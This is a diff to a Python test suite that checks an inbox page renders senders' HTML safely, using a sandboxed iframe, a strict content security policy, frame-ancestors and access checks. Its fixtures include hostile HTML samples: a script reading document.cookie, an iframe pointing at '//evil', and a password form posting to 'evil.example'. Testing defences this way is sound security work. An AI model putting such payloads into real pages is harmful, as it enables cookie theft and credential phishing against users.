@@ -12,6 +12,7 @@ at and says why, instead of a bare JSON envelope in a browser tab.
 
 from __future__ import annotations
 
+import re
 from datetime import UTC, datetime, timedelta
 from typing import Any
 
@@ -296,9 +297,13 @@ async def test_nothing_a_stranger_wrote_reaches_the_detail_page_as_markup(
     assert page.text.count("&lt;script&gt;") >= 8
 
 
-async def test_the_html_body_is_source_here_and_never_rendered_into_the_page(
+async def test_the_senders_html_is_never_written_into_the_page(
     app_client: AsyncClient, db_session: AsyncSession
 ) -> None:
+    """The message's HTML reaches the browser as a document of its own, in a frame.
+    It is never part of this page: not inlined, not in a srcdoc, and the sender's
+    own elements - including an iframe of theirs - exist only as escaped text.
+    """
     _, project = await _signed_in_with_project(app_client, db_session)
     message = await _seed(
         db_session, project, html_body='<p id="pwned">x</p><iframe src="//evil"></iframe>'
@@ -306,11 +311,154 @@ async def test_the_html_body_is_source_here_and_never_rendered_into_the_page(
 
     page = await app_client.get(f"/inbox/{message.id}")
 
-    # Neither element exists in the page, and both survive as visible text.
     assert '<p id="pwned">' not in page.text
-    assert "<iframe" not in page.text
+    assert "srcdoc" not in page.text
+    # Exactly one frame exists, and it is ours: the sender's is only visible text.
+    assert page.text.count("<iframe") == 1
+    assert '<iframe src="//evil"' not in page.text
     assert "&lt;p id=" in page.text
     assert "&lt;iframe" in page.text
+
+
+async def test_the_preview_frame_is_sandboxed_with_no_permissions_at_all(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """``sandbox`` with no tokens. ``allow-scripts`` together with
+    ``allow-same-origin`` would let the frame remove its own sandbox, so neither - and
+    nothing else - may ever be granted.
+    """
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project)
+
+    page = await app_client.get(f"/inbox/{message.id}")
+
+    (frame,) = re.findall(r"<iframe[^>]*>", page.text)
+    assert 'sandbox=""' in frame
+    assert f'src="/inbox/{message.id}/html"' in frame
+    assert "allow-" not in frame
+
+
+async def test_a_message_with_no_html_has_no_frame(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project, html_body="")
+
+    page = await app_client.get(f"/inbox/{message.id}")
+
+    assert "<iframe" not in page.text
+
+
+async def test_adding_the_frame_did_not_loosen_the_page_that_holds_it(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """The page that frames a stranger's document is the one holding the session.
+    It must still refuse to be framed itself and keep its own policy.
+    """
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project)
+
+    response = await app_client.get(f"/inbox/{message.id}")
+
+    assert response.headers["x-frame-options"] == "DENY"
+    assert "frame-ancestors 'none'" in response.headers["content-security-policy"]
+    assert "script-src 'self' 'nonce-" in response.headers["content-security-policy"]
+    assert "sandbox" not in response.headers["content-security-policy"]
+
+
+# --------------------------------------------------- the HTML as a document ---
+
+
+async def test_the_html_is_served_exactly_as_sent_inside_a_tight_policy(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """Not cleaned: a sanitiser is one more thing to get wrong. What contains it is
+    the policy, and a test that the bytes arrive unaltered is also a test that nobody
+    quietly added one.
+    """
+    _, project = await _signed_in_with_project(app_client, db_session)
+    hostile = '<html><body><script>alert(document.cookie)</script><img src="http://t.example/p.gif"><form action="http://evil.example"><input name=pw></form></body></html>'
+    message = await _seed(db_session, project, html_body=hostile)
+
+    response = await app_client.get(f"/inbox/{message.id}/html")
+
+    assert response.status_code == 200
+    assert response.text == hostile
+    assert response.headers["content-type"] == "text/html; charset=utf-8"
+
+
+async def test_the_policy_on_the_html_blocks_script_network_forms_and_navigation(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project)
+
+    response = await app_client.get(f"/inbox/{message.id}/html")
+    policy = response.headers["content-security-policy"]
+    directives = {part.strip().split(" ", 1)[0]: part.strip() for part in policy.split(";")}
+
+    # `sandbox` with no tokens: opaque origin, no script, no forms, no navigation.
+    assert directives["sandbox"] == "sandbox"
+    # Nothing loads from the network, which blocks tracking pixels and remote images.
+    assert directives["default-src"] == "default-src 'none'"
+    assert directives["img-src"] == "img-src data:"
+    # Inline styles are the one thing allowed; without them most mail is unreadable.
+    assert directives["style-src"] == "style-src 'unsafe-inline'"
+    assert "script-src" not in directives
+    assert "unsafe-eval" not in policy
+    assert "'self'" not in policy.replace("frame-ancestors 'self'", "")
+
+
+async def test_only_the_message_page_may_frame_the_html(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """The middleware used to force every response to DENY. This is the one that has
+    to be framed, by the same origin and nobody else.
+    """
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project)
+
+    response = await app_client.get(f"/inbox/{message.id}/html")
+
+    assert response.headers["x-frame-options"] == "SAMEORIGIN"
+    assert "frame-ancestors 'self'" in response.headers["content-security-policy"]
+    assert response.headers["x-content-type-options"] == "nosniff"
+    assert response.headers["referrer-policy"] == "no-referrer"
+    assert response.headers["cache-control"] == "private, no-store"
+
+
+async def test_a_message_with_no_html_says_so_on_its_own_page(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    _, project = await _signed_in_with_project(app_client, db_session)
+    message = await _seed(db_session, project, html_body="")
+
+    response = await app_client.get(f"/inbox/{message.id}/html")
+
+    assert response.status_code == 404
+    assert response.headers["content-type"].startswith("text/html")
+    assert "no HTML body" in response.text
+
+
+async def test_the_html_route_gives_a_stranger_nothing(
+    app_client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """Another project's id and one that never existed answer the same, and without
+    a session there is nothing at all.
+    """
+    await _signed_in_with_project(app_client, db_session)
+    other_user = await register_user(
+        db_session, email="other@example.com", password="correct-horse-battery", allow_signup=True
+    )
+    theirs = await create_project(db_session, user_id=other_user.id, name="Other")
+    foreign = await _seed(db_session, theirs, html_body="<p>secret</p>")
+
+    a = await app_client.get(f"/inbox/{foreign.id}/html", follow_redirects=False)
+    b = await app_client.get("/inbox/inbound_01NEVEREXISTED/html", follow_redirects=False)
+
+    assert (a.status_code, a.headers.get("location")) == (b.status_code, b.headers.get("location"))
+    assert a.status_code == 303
+    assert "secret" not in a.text
 
 
 async def test_another_projects_message_and_an_unknown_one_look_identical(
